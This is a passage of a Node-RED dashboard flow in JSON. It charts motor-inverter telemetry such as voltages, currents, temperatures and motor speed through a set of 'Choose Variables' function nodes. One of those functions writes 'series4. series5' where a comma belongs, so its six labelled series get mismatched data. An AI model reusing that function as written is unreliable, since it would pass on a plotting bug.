        "topic": "starting_time",
        "sendOnBlur": true,
        "className": "",
        "topicType": "str",
        "x": 160,
        "y": 200,
        "wires": [
            [
                "2d7ae46e37749455",
                "4fe51564a57fadc6"
            ]
        ]
    },
    {
        "id": "314c2540a5fc8d19",
        "type": "ui_slider",
        "z": "a5a35a884df38a1a",
        "name": "",
        "label": "Duration (Minutes)",
        "tooltip": "",
        "group": "37fa01b38570666f",
        "order": 2,
        "width": 0,
        "height": 0,
        "passthru": true,
        "outs": "all",
        "topic": "duration",
        "topicType": "str",
        "min": 0,
        "max": "30",
        "step": 1,
        "className": "",
        "x": 170,
        "y": 240,
        "wires": [
            [
                "2d7ae46e37749455",
                "c1c9b5fa63dd2aa0"
            ]
        ]
    },
    {
        "id": "2d7ae46e37749455",
        "type": "join",
        "z": "a5a35a884df38a1a",
        "name": "",
        "mode": "custom",
        "build": "object",
        "property": "payload",
        "propertyType": "msg",
        "key": "topic",
        "joiner": "\\n",
        "joinerType": "str",
        "accumulate": true,
        "timeout": "",
        "count": "2",
        "reduceRight": false,
        "reduceExp": "",
        "reduceInit": "",
        "reduceInitType": "",
        "reduceFixup": "",
        "x": 350,
        "y": 220,
        "wires": [
            [
                "107e61d82c73e1c1",
                "3432d802fd06c02a"
            ]
        ]
    },
    {
        "id": "4fe51564a57fadc6",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 4,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Start",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 290,
        "y": 140,
        "wires": []
    },
    {
        "id": "c1c9b5fa63dd2aa0",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "group": "37fa01b38570666f",
        "order": 3,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Duration",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 320,
        "y": 300,
        "wires": []
    },
    {
        "id": "3432d802fd06c02a",
        "type": "ui_text",
        "z": "a5a35a884df38a1a",
        "d": true,
        "group": "881b1308b85cd435",
        "order": 5,
        "width": 0,
        "height": 0,
        "name": "",
        "label": "Func Input",
        "format": "{{msg.payload}}",
        "layout": "row-spread",
        "className": "",
        "x": 510,
        "y": 260,
        "wires": []
    },
    {
        "id": "6606b0ddb159879f",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 11,
        "width": "10",
        "height": 6,
        "label": "Reference Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "3bce2f5f5926f774",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 15,
        "width": "10",
        "height": 6,
        "label": "Iq and Id Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "2325192d4672564c",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 12,
        "width": "10",
        "height": 6,
        "label": "Feedforward Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1380,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "14aca8d8ad10e004",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 13,
        "width": "10",
        "height": 6,
        "label": "Voltage Between Phases",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1390,
        "y": 180,
        "wires": [
            []
        ]
    },
    {
        "id": "b91347274bee8f32",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 10,
        "width": "10",
        "height": "6",
        "label": "Voltages (Other)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 220,
        "wires": [
            []
        ]
    },
    {
        "id": "28a8f2d45c80f20e",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 14,
        "width": "10",
        "height": "6",
        "label": "Currents (Others)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "4bac67e9bc436452",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "7389cb949baabe46",
        "order": 12,
        "width": 8,
        "height": 6,
        "label": "Phase Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 340,
        "wires": [
            []
        ]
    },
    {
        "id": "e12348898725e889",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Motor Speed",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1350,
        "y": 420,
        "wires": [
            []
        ]
    },
    {
        "id": "26803a8b2ad138aa",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 9,
        "width": "10",
        "height": "6",
        "label": "Motor Angle (Electrical)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1390,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "cee58944ef8ded67",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1360,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "60546afd373bb3e0",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "RTD Input Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1390,
        "y": 560,
        "wires": [
            []
        ]
    },
    {
        "id": "a87287b63d7a56dc",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Board Temeperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1380,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "f532b429468ce19f",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Module Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1380,
        "y": 640,
        "wires": [
            []
        ]
    },
    {
        "id": "763a6ba5998417a2",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 16,
        "width": "10",
        "height": "6",
        "label": "Diagnostic Phase Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1400,
        "y": 700,
        "wires": [
            []
        ]
    },
    {
        "id": "64212f27e7ed2872",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 18,
        "width": "10",
        "height": "6",
        "label": "Command Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 740,
        "wires": [
            []
        ]
    },
    {
        "id": "a239299933bef655",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 17,
        "width": "10",
        "height": "6",
        "label": "Command Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 820,
        "wires": [
            []
        ]
    },
    {
        "id": "5fd4ae9fbd270645",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 21,
        "width": "10",
        "height": "6",
        "label": "PWM Frequency",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 860,
        "wires": [
            []
        ]
    },
    {
        "id": "8d79420c84062d6b",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "37fa01b38570666f",
        "order": 19,
        "width": "10",
        "height": "6",
        "label": "Max BMS Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1370,
        "y": 940,
        "wires": [
            []
        ]
    },
    {
        "id": "73d0aa067a7b1026",
        "type": "ui_chart",
        "z": "a5a35a884df38a1a",
        "name": "",
        "group": "b49fa523c2129f05",
        "order": 10,
        "width": 8,
        "height": 6,
        "label": "Torques",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "1",
        "removeOlderPoints": "100000",
        "removeOlderUnit": "3600",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1340,
        "y": 900,
        "wires": [
            []
        ]
    },
    {
        "id": "3f77ee8a1510677f",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_output_voltage);\nlet series2 = msg.payload.map(item => item.inv_dc_bus_voltage);\nlet series3 = msg.payload.map(item => item.inv_fast_dc_bus_voltage);\nlet series4 = msg.payload.map(item => item.inv_stall_burst_model_temperature);\nlet series5 = msg.payload.map(item => item.inv_diag_vdc);\nlet series6 = msg.payload.map(item => item.inv_diag_vqs_cmd);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Output Voltage\", \"INV DC Bus Voltage\", \"INV Fast DC Bus Voltage\", \"INV Stall Burst Model Temperature\",\"INV Diag Vdc\",\"INV Diag Vqs CMD\"],\n        \"data\": [series1, series2, series3, series4. series5, series6],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 220,
        "wires": [
            [
                "b91347274bee8f32"
            ]
        ]
    },
    {
        "id": "354b6bbdf930116d",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_dc_bus_current);\nlet series2 = msg.payload.map(item => item.inv_diag_fw_output);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV DC Bus Current\", \"INV Diag FW Output\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 260,
        "wires": [
            [
                "28a8f2d45c80f20e"
            ]
        ]
    },
    {
        "id": "c1dbb1ec98c57aba",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_phase_a_current);\nlet series2 = msg.payload.map(item => item.inv_phase_b_current);\nlet series3 = msg.payload.map(item => item.inv_phase_c_current);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Phase A Current\", \"INV Phase B Current\", \"INV Phase C Current\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 340,
        "wires": [
            [
                "4bac67e9bc436452"
            ]
        ]
    },
    {
        "id": "5d12423eb237299d",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_speed);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Motor Speed\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 420,
        "wires": [
            [
                "e12348898725e889"
            ]
        ]
    },
    {
        "id": "5e1e1ac619816c05",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_angle_electrical);\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Angle Electrical\"],\n        \"data\": [series1],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 480,
        "wires": [
            [
                "26803a8b2ad138aa"
            ]
        ]
    },
    {
        "id": "7346961e9bc86d1b",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_motor_temperature);\nlet series2 = msg.payload.map(item => item.inv_hot_spot_temperature);\nlet series3 = msg.payload.map(item => item.inv_coolant_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"Motor Temperature\", \"Hot Spot Temperature\", \"Coolant Temperature\"],\n        \"data\": [series1, series2, series3],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 520,
        "wires": [
            [
                "cee58944ef8ded67"
            ]
        ]
    },
    {
        "id": "629f06c4e2507c71",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_ref_voltage_12_0);\nlet series2 = msg.payload.map(item => item.inv_ref_voltage_5_0);\nlet series3 = msg.payload.map(item => item.inv_ref_voltage_2_5);\nlet series4 = msg.payload.map(item => item.inv_ref_voltage_1_5);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV REF Voltage 12.0\", \"INV REF Voltage 5.0\", \"INV REF Voltage 2.5\", \"INV REF Voltage 1.5\"],\n        \"data\": [series1, series2, series3, series4],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 60,
        "wires": [
            [
                "6606b0ddb159879f"
            ]
        ]
    },
    {
        "id": "d3b3112a27dec1a5",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_iq);\nlet series2 = msg.payload.map(item => item.inv_id);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Iq\", \"INV Id\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 100,
        "wires": [
            [
                "3bce2f5f5926f774"
            ]
        ]
    },
    {
        "id": "51528fa94f8bc774",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_vq_ff);\nlet series2 = msg.payload.map(item => item.inv_vd_ff);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Vq FF\", \"INV Vd FF\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 140,
        "wires": [
            [
                "2325192d4672564c"
            ]
        ]
    },
    {
        "id": "639f7b8a0640fe69",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_vbc_vq_voltage);\nlet series2 = msg.payload.map(item => item.inv_vab_vd_voltage);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Vbc-Vq Voltage\", \"INV Vab-Vd Voltage\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 180,
        "wires": [
            [
                "14aca8d8ad10e004"
            ]
        ]
    },
    {
        "id": "150676ae27de9713",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_rtd2_temperature);\nlet series2 = msg.payload.map(item => item.inv_rtd1_temperature);\n\nmsg.payload = [\n    {\n        \"series\": [\"INV rtd2 temperature\", \"INV rtd1 temperature\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 560,
        "wires": [
            [
                "60546afd373bb3e0"
            ]
        ]
    },
    {
        "id": "d0954a33c4746f3c",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
        "func": "let timestamps = msg.payload.map(item => {\n    let date = new Date(item.timestamp * 1000);\n    return '  ' + date.getHours() + ':' + ('0' + date.getMinutes()).slice(-2) + ':' + ('0' + date.getSeconds()).slice(-2) + '  ';\n});\nlet series1 = msg.payload.map(item => item.inv_control_board_temperature);\nlet series2 = msg.payload.map(item => item.inv_gate_driver_board_temperature);\n\n\nmsg.payload = [\n    {\n        \"series\": [\"INV Control Board Temperature\", \"INV Gate Driver Board Temperature\"],\n        \"data\": [series1, series2],\n        \"labels\": timestamps\n    }\n];\n\nreturn msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 1050,
        "y": 600,
        "wires": [
            [
                "a87287b63d7a56dc"
            ]
        ]
    },
    {
        "id": "259fc783c92c7936",
        "type": "function",
        "z": "a5a35a884df38a1a",
        "name": "Choose Variables",
